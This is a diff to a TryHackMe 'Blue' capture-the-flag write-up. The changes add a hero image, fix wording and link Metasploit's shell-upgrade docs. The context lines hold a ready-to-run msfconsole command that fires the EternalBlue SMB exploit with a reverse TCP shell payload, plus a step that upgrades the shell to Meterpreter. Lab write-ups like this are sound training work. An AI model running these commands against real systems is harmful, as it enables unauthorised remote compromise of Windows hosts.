@@ -3,6 +3,7 @@ title: 'TryHackMe - Blue'
 description: "Vulnerability scanning using nmap, exploitation using metasploit. Examples of creating a reverse TCP shell, upgrading the shell, process migration, hash cracking, and search to find flags."
 author: 'Tim Sonner'
 date: '2023-06-29'
+hero: '/thm-blue/thm-blue-hero.png'
 published: true
 ---
 
@@ -34,7 +35,7 @@ https://www.exploit-db.com/exploits/41891
 
 ## Exploit  
 
-**Run msfconsole and perform reverse tcp shell exploit**
+**Run msfconsole and perform reverse TCP shell exploit**
 ```  
 msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set payload windows/x64/shell/reverse_tcp;setg RHOSTS $IP;setg LHOST tun0;run"  
 ```  
@@ -77,7 +78,9 @@ search upgrade shell
 ```  
 use shell_to_meterpreter  
 ```
-> Alternative: "use 4" (4th result in searches)
+> Alternative: "use 4" (4th result in searches).  
+  A Super l33t hax0r trick about upgrading shells is here...  
+ https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html 
 
  ![](/thm-blue/thm-blue-run-upgrade-shell.png)  
 
